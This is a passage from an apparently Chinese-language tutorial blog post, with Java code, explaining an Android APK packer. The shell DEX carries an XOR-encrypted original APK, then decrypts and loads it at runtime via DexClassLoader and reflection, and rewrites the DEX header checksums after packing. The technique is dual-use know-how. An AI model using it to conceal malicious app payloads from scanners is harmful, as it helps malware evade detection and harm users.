class="hljs-string">&quot;android.app.ActivityThread&quot;</span>,<span class="hljs-string">&quot;mInitialApplication&quot;</span>, currentActivityThread, app);<br><br>          <span class="hljs-type">ArrayMap</span> <span class="hljs-variable">mProviderMap</span> <span class="hljs-operator">=</span> (ArrayMap) RefInvoke.getFieldOjbect(<span class="hljs-string">&quot;android.app.ActivityThread&quot;</span>, currentActivityThread,<span class="hljs-string">&quot;mProviderMap&quot;</span>);<br>          <span class="hljs-type">Iterator</span> <span class="hljs-variable">it</span> <span class="hljs-operator">=</span> mProviderMap.values().iterator();<br>          <span class="hljs-keyword">while</span> (it.hasNext()) &#123;<br>              <span class="hljs-type">Object</span> <span class="hljs-variable">providerClientRecord</span> <span class="hljs-operator">=</span> it.next();<br>              <span class="hljs-type">Object</span> <span class="hljs-variable">localProvider</span> <span class="hljs-operator">=</span> RefInvoke.getFieldOjbect(<span class="hljs-string">&quot;android.app.ActivityThread$ProviderClientRecord&quot;</span>, providerClientRecord, <span class="hljs-string">&quot;mLocalProvider&quot;</span>);<br>              RefInvoke.setFieldOjbect(<span class="hljs-string">&quot;android.content.ContentProvider&quot;</span>, <span class="hljs-string">&quot;mContext&quot;</span>, localProvider, app);<br>          &#125;<br><br>          app.onCreate();<br><br>          Log.e(TAG, <span class="hljs-string">&quot;app:&quot;</span>+app);<br><br>      &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>          e.printStackTrace();<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure>



<p>提取源dex</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">splitPayLoadFromDex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] shelldexdata)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>       <span class="hljs-comment">//取被加壳apk的长度</span><br>       <span class="hljs-type">int</span> <span class="hljs-variable">sdlen</span> <span class="hljs-operator">=</span> shelldexdata.length;<br>       <span class="hljs-type">byte</span>[] bytedexlen = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4</span>];<br>       System.arraycopy(shelldexdata, sdlen - <span class="hljs-number">4</span>, bytedexlen, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br><br>       <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytedexlen);<br>       <span class="hljs-type">DataInputStream</span> <span class="hljs-variable">dis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(bais);<br>       <span class="hljs-type">int</span> <span class="hljs-variable">readInt</span> <span class="hljs-operator">=</span> dis.readInt();<br>       Log.d(TAG,<span class="hljs-string">&quot;Integer.toHexString(readInt):&quot;</span>+Integer.toHexString(readInt));<br><br>       <span class="hljs-comment">//取出壳apk</span><br>       <span class="hljs-type">byte</span>[] encryptdata = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[readInt]; <span class="hljs-comment">//这是一个变量名，用于存储从输入流中读取的整数。</span><br>       System.arraycopy(shelldexdata, sdlen - <span class="hljs-number">4</span> - readInt, encryptdata, <span class="hljs-number">0</span>, readInt);<br><br>       <span class="hljs-comment">//对源程序Apk进行解密</span><br>       <span class="hljs-type">byte</span>[] flatdata = xorcrypt(encryptdata);<br><br>       <span class="hljs-type">int</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;    <span class="hljs-comment">//跟踪数据的位置</span><br>       <span class="hljs-type">byte</span> [] byteunamelen = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4</span>];  <span class="hljs-comment">//用户名长度信息</span><br>       System.arraycopy(flatdata, offset, byteunamelen, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>); <span class="hljs-comment">//从flatdata数组中复制4个字节到byteunamelen数组</span><br>       offset += <span class="hljs-number">4</span>;<br><br>       <span class="hljs-type">int</span> <span class="hljs-variable">unamelen</span> <span class="hljs-operator">=</span> Utils.bytesToInt(byteunamelen);  <span class="hljs-comment">//将字节转换为整数，得到用户名的长度</span><br>       <span class="hljs-type">byte</span>[] username = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[unamelen];<br>       System.arraycopy(flatdata , offset, username, <span class="hljs-number">0</span>, unamelen);<br>       offset += unamelen;<br><br>       gUserNameStr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(username);<br><br>       <span class="hljs-type">byte</span> [] byteiplen = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4</span>]; <span class="hljs-comment">//创建一个新的数组byteiplen用于存储IP地址的长度信息。</span><br>       System.arraycopy(flatdata, offset, byteiplen, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>       offset += <span class="hljs-number">4</span>;<br><br>       <span class="hljs-type">int</span> <span class="hljs-variable">iplen</span> <span class="hljs-operator">=</span> Utils.bytesToInt(byteiplen);<br>       <span class="hljs-type">byte</span>[] ip = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[iplen];<br>       System.arraycopy(flatdata , offset, ip, <span class="hljs-number">0</span>, iplen);<br>       offset += iplen;<br><br>       gIPstr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(ip);<br><br>       Log.e(TAG,<span class="hljs-string">&quot;username:&quot;</span>+ gUserNameStr + <span class="hljs-string">&quot; ip:&quot;</span> + gIPstr);  <span class="hljs-comment">//记录用户名和IP地址到日志。</span><br><br>       Utils.setValue(context,PARAMCONFIG_FileName,<span class="hljs-string">&quot;username&quot;</span>,gUserNameStr);  <span class="hljs-comment">//将用户名和IP地址保存到配置文件中。</span><br>       Utils.setValue(context,PARAMCONFIG_FileName,<span class="hljs-string">&quot;ip&quot;</span>,gIPstr);<br><br>       <span class="hljs-comment">//写入源apk文件</span><br>       <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(srcDexFilePath);  <span class="hljs-comment">//创建一个新的文件对象，它指向源DEX文件的路径</span><br>       <span class="hljs-keyword">try</span> &#123;<br>           <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">localFileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(file);  <span class="hljs-comment">//打开file文件输出流</span><br>           localFileOutputStream.write(flatdata,offset,readInt - offset);  <span class="hljs-comment">//从offset开始的flatdata数组写入</span><br>           localFileOutputStream.close();  <span class="hljs-comment">//关闭</span><br>       &#125; <span class="hljs-keyword">catch</span> (IOException localIOException) &#123;<br>           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(localIOException);<br>       &#125;<br><br>       <span class="hljs-type">int</span> <span class="hljs-variable">bits</span> <span class="hljs-operator">=</span> Utils.getSystemBits();     <span class="hljs-comment">//Utils.getSystemBits()方法（此方法没有在代码片段中定义）来获取当前系统的位数（通常是32位或64位）</span><br>       <span class="hljs-type">String</span> <span class="hljs-variable">libprefix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;lib/&quot;</span> + Build.CPU_ABI;  <span class="hljs-comment">//Build.CPU_ABI是Android提供的一个变量，代表当前设备首选的ABI（应用程序二进制接口）。</span><br><br>       <span class="hljs-comment">//分析源apk文件</span><br>       <span class="hljs-type">ZipInputStream</span> <span class="hljs-variable">zis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(file)));  <span class="hljs-comment">//读取APK</span><br>      <span class="hljs-comment">//用于遍历APK文件中的每个ZIP条目</span><br>       <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>           <span class="hljs-type">ZipEntry</span> <span class="hljs-variable">ze</span> <span class="hljs-operator">=</span> zis.getNextEntry();<br>           <span class="hljs-keyword">if</span> (ze == <span class="hljs-literal">null</span>) &#123;<br>               <span class="hljs-keyword">break</span>;<br>           &#125;<br>           <br>           <span class="hljs-comment">//依次取出被加壳apk用到的so文件，放到 libPath中（data/data/包名/payload_lib)</span><br>           <span class="hljs-type">String</span> <span class="hljs-variable">zfn</span> <span class="hljs-operator">=</span> ze.getName();  <span class="hljs-comment">//对于每个ZIP条目，获取其名称并存储在zfn变量中。</span><br><br>           <span class="hljs-keyword">if</span> (zfn.startsWith(libprefix) &amp;&amp; zfn.endsWith(<span class="hljs-string">&quot;.so&quot;</span>)) &#123;  <span class="hljs-comment">//判断是否为so文件  zfn.startsWith(libprefix)//检查开头</span><br>               <span class="hljs-comment">//zfn.substring(zfn.lastIndexOf(&#x27;/&#x27;))截取so文件的名称，用于存放解压后的so文件</span><br>               <span class="hljs-type">File</span> <span class="hljs-variable">sofile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(libPath + zfn.substring(zfn.lastIndexOf(<span class="hljs-string">&#x27;/&#x27;</span>)));  <br>               <br>               sofile.createNewFile();  <span class="hljs-comment">//创建文件</span><br>               <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(sofile); <span class="hljs-comment">//写入</span><br>               <span class="hljs-type">byte</span>[] readbuf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0x4000</span>];  <span class="hljs-comment">//缓冲区</span><br>               <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;   <span class="hljs-comment">//ZIP流中读取数据</span><br>                   <span class="hljs-type">int</span> <span class="hljs-variable">readlen</span> <span class="hljs-operator">=</span> zis.read(readbuf);<br>                   <span class="hljs-keyword">if</span> (readlen == -<span class="hljs-number">1</span>)&#123;<br>                       <span class="hljs-keyword">break</span>;<br>                   &#125;<br>                   fos.write(readbuf, <span class="hljs-number">0</span>, readlen);<br>               &#125;<br>               fos.flush();<br>               fos.close();<br>               Log.e(TAG,<span class="hljs-string">&quot;get lib:&quot;</span> + zfn );<br>           &#125;<br>           zis.closeEntry();<br>       &#125;<br>       zis.close();<br>   &#125;<br><br></code></pre></td></tr></table></figure>

<p>核心代码;</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">splitPayLoadFromDex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] shelldexdata)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <span class="hljs-comment">//shelldexdata==dexdata</span><br>       <span class="hljs-comment">//取被加壳apk的长度</span><br>       <span class="hljs-type">int</span> <span class="hljs-variable">sdlen</span> <span class="hljs-operator">=</span> shelldexdata.length;<br>       <span class="hljs-type">byte</span>[] bytedexlen = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4</span>];<br>       System.arraycopy(shelldexdata, sdlen - <span class="hljs-number">4</span>, bytedexlen, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br><br>       <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytedexlen);<br>       <span class="hljs-type">DataInputStream</span> <span class="hljs-variable">dis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(bais);<br>       <span class="hljs-type">int</span> <span class="hljs-variable">readInt</span> <span class="hljs-operator">=</span> dis.readInt();<br>       Log.d(TAG,<span class="hljs-string">&quot;Integer.toHexString(readInt):&quot;</span>+Integer.toHexString(readInt));<br><br>       <span class="hljs-comment">//取出apk</span><br>       <span class="hljs-type">byte</span>[] encryptdata = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[readInt];<br>       System.arraycopy(shelldexdata, sdlen - <span class="hljs-number">4</span> - readInt, encryptdata, <span class="hljs-number">0</span>, readInt);<br><br>       <span class="hljs-comment">//对源程序Apk进行加密</span><br>       <span class="hljs-type">byte</span>[] flatdata = xorcrypt(encryptdata);<br><br>       <span class="hljs-type">int</span> <span class="hljs-variable">offset</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;    <span class="hljs-comment">//跟踪数据的位置</span><br>       <span class="hljs-type">byte</span> [] byteunamelen = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4</span>];  <span class="hljs-comment">//用户名长度信息</span><br>       System.arraycopy(flatdata, offset, byteunamelen, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>); <span class="hljs-comment">//从flatdata数组中复制4个字节到byteunamelen数组</span><br>       offset += <span class="hljs-number">4</span>;<br><br>       <span class="hljs-type">int</span> <span class="hljs-variable">unamelen</span> <span class="hljs-operator">=</span> Utils.bytesToInt(byteunamelen);  <span class="hljs-comment">//将字节转换为整数，得到用户名的长度</span><br>       <span class="hljs-type">byte</span>[] username = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[unamelen];<br>       System.arraycopy(flatdata , offset, username, <span class="hljs-number">0</span>, unamelen);<br>       offset += unamelen;<br><br>       gUserNameStr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(username);<br><br>       <span class="hljs-type">byte</span> [] byteiplen = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4</span>]; <span class="hljs-comment">//创建一个新的数组byteiplen用于存储IP地址的长度信息。</span><br>       System.arraycopy(flatdata, offset, byteiplen, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>       offset += <span class="hljs-number">4</span>;<br><br>       <span class="hljs-type">int</span> <span class="hljs-variable">iplen</span> <span class="hljs-operator">=</span> Utils.bytesToInt(byteiplen);<br>       <span class="hljs-type">byte</span>[] ip = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[iplen];<br>       System.arraycopy(flatdata , offset, ip, <span class="hljs-number">0</span>, iplen);<br>       offset += iplen;<br><br>       gIPstr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(ip);<br></code></pre></td></tr></table></figure>



<p>加密函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] xorcrypt(<span class="hljs-type">byte</span>[] srcdata)&#123;<br>    <span class="hljs-type">byte</span>[] key = cryptKey.getBytes();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">keylen</span> <span class="hljs-operator">=</span> cryptKey.length();<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,j = <span class="hljs-number">0</span>; i&lt;srcdata.length; i++)&#123;<br>        srcdata[i] = (<span class="hljs-type">byte</span>)(key[j] ^ srcdata[i]);<br>        j ++;<br>        <span class="hljs-keyword">if</span>(j &gt;= keylen)&#123;<br>            j = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> srcdata;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>apkshell</p>
<p>通过apkUnshell.app进行解密提取出源dex，然后进行加壳 </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">encryptsize</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>)( <span class="hljs-number">4</span> + username.length() + <span class="hljs-number">4</span> + ip.length() + srcApkFile.length());<br><span class="hljs-type">byte</span>[] enSrcApkArray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[encryptsize];<br><span class="hljs-comment">// ... 将用户名长度、用户名、IP长度、IP和原始APK数据复制到数组中</span><br>xorcrpt(enSrcApkArray); <span class="hljs-comment">// 异或加密APK数据</span><br><br><span class="hljs-comment">// ... 读取壳APK的DEX文件</span><br><span class="hljs-type">byte</span>[] newdex = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[totalLen];<br>System.arraycopy(unShellDexArray, <span class="hljs-number">0</span>, newdex, <span class="hljs-number">0</span>, unShellDexLen); <span class="hljs-comment">// 复制壳DEX数据</span><br>System.arraycopy(enSrcApkArray, <span class="hljs-number">0</span>, newdex, unShellDexLen, enSrcApkLen); <span class="hljs-comment">// 复制加密后的APK数据</span><br><br>fixFileSizeHeader(newdex); <span class="hljs-comment">// 修改DEX文件头中的文件大小信息</span><br>fixSHA1Header(newdex); <span class="hljs-comment">// 修改DEX文件头中的SHA-1散列值</span><br>fixCheckSumHeader(newdex); <span class="hljs-comment">// 修改DEX文件头中的校验和</span><br><br><span class="hljs-comment">// ... 将新的DEX文件写入文件系统</span><br><span class="hljs-comment">// 删除META-INF目录</span><br>ZipUtils.zipDir(shellApkfn + <span class="hljs-string">&quot;_new.apk&quot;</span>, unzipPath); <span class="hljs-comment">// 将修改后的文件重新压缩打包成APK</span><br><br></code></pre></td></tr></table></figure>

<p>在提供的代码中，修改DEX文件头部的一些信息，具体指文件大小、SHA-1哈希和校验和的部分位于以下几个方法：</p>
<p><strong>修改文件大小 (<code>fixFileSizeHeader</code>)：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fixFileSizeHeader</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] dexBytes)</span> &#123;<br>    <span class="hljs-type">byte</span>[] newfs = intToByte(dexBytes.length);  <br>    <span class="hljs-type">byte</span>[] refs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4</span>]; <br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        refs[i] = newfs[newfs.length - <span class="hljs-number">1</span> - i];<br>    &#125;<br>    <br>    System.arraycopy(refs, <span class="hljs-number">0</span>, dexBytes, <span class="hljs-number">32</span>, <span class="hljs-number">4</span>);<br>    <br>    System.out.println(<span class="hljs-string">&quot;new dex file size:&quot;</span> + Integer.toHexString(dexBytes.length));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这个方法使用了<code>intToByte</code>方法来将DEX文件的新长度转换成字节数组，并更新DEX文件头中的文件大小字段。</p>
<p><strong>修改SHA-1哈希 (<code>fixSHA1Header</code>)：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fixSHA1Header</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] dexBytes)</span> <span class="hljs-keyword">throws</span> NoSuchAlgorithmException &#123;  <br>    <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">&quot;SHA-1&quot;</span>);  <br>    md.update(dexBytes, <span class="hljs-number">32</span>, dexBytes.length - <span class="hljs-number">32</span>); <span class="hljs-comment">// 从32字节之后开始计算SHA-1哈希值</span><br><br>    <span class="hljs-type">byte</span>[] newdt = md.digest();  <br>    System.arraycopy(newdt, <span class="hljs-number">0</span>, dexBytes, <span class="hljs-number">12</span>, <span class="hljs-number">20</span>); <span class="hljs-comment">// SHA-1哈希值长度为20字节</span><br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">hexstr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;  <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; newdt.length; i++) &#123;  <br>        hexstr += Integer.toString((newdt[i] &amp; <span class="hljs-number">0xff</span>) + <span class="hljs-number">0x100</span>, <span class="hljs-number">16</span>).substring(<span class="hljs-number">1</span>);<br>    &#125;  <br>    System.out.println(<span class="hljs-string">&quot;new dex sha-1:&quot;</span> + hexstr);  <br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>这个方法计算了从第32字节到文件末尾的SHA-1哈希，并将结果复制到DEX头的SHA-1哈希字段中。</p>
<p><strong>修改校验和 (<code>fixCheckSumHeader</code>)：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fixCheckSumHeader</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] dexBytes)</span> &#123;  <br>    <span class="hljs-type">Adler32</span> <span class="hljs-variable">adler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Adler32</span>();  <br>    adler.update(dexBytes, <span class="hljs-number">12</span>, dexBytes.length - <span class="hljs-number">12</span>); <span class="hljs-comment">// 从12字节之后开始计算校验和</span><br><br>    <span class="hljs-type">int</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>)adler.getValue();  <br>    <span class="hljs-type">byte</span>[] newcs = intToByte(value);  <br><br>    <span class="hljs-type">byte</span>[] recs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">4</span>];  <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;  <br>        recs[i] = newcs[newcs.length - <span class="hljs-number">1</span> - i];  <br>    &#125;  <br>    <br>    System.arraycopy(recs, <span class="hljs-number">0</span>, dexBytes, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>); <span class="hljs-comment">// 校验和字段位于8-11字节</span><br>    <br>    System.out.println(<span class="hljs-string">&quot;new dex checksum:&quot;</span> +Integer.toHexString(value));<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>这个方法使用<code>Adler32</code>算法来计算DEX文件的校验和，并将其更新到DEX文件头中的相应字段。</p>
<p>流程：</p>
<p>简要：</p>
<ol>
<li>原始dex加密。</li>
<li>记录dex还原信息。</li>
<li>壳dex尾部追加加密。</li>
<li>追加dex还原信息。</li>
<li>追加还原信息长度。</li>
<li>filesize：dex原来长度+dex加密字节长度+dex还原信息长度+4字节（还原信息长度）。</li>
<li>计算signature（除了标识头，checksum其余的hash值）。</li>
<li>计算chceksum（除了标识头，checksum外所有）。</li>
<li>重新打包。</li>
</ol>
<p>实现还原：</p>
<ol>
<li>末尾4字节</li>
<li>得到还原信息</li>
<li>得到dex字节列表进行加密</li>
<li>dexclassloader进行加载替换 结束</li>
</ol>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs stylus">第一部分释放出源程序apk。<br><br><span class="hljs-number">1</span>.获取当前android<span class="hljs-selector-class">.app</span>.ActivityThread类对象currentActivityThread，并在其中找到ArrayMap类型的对象成员mPackages，并在mPackages中找到当前包名的android<span class="hljs-selector-class">.app</span>.LoadedApk对象。<br><span class="hljs-number">2</span>.在上述android<span class="hljs-selector-class">.app</span>.ActivityThread实例中，找到ClassLoader类的实例成员mClassLoader。<br><span class="hljs-number">3</span>.通过DexClassLoader加载释放出来的源程序apk。<br><span class="hljs-number">4</span>.将上述mClassLoader替换为加载源程序的DexClassLoader。<br><br><br>第二部分功能在onCreate方法中，其主要工作如下:<br><br><span class="hljs-number">1</span>.加载资源。<br><br><span 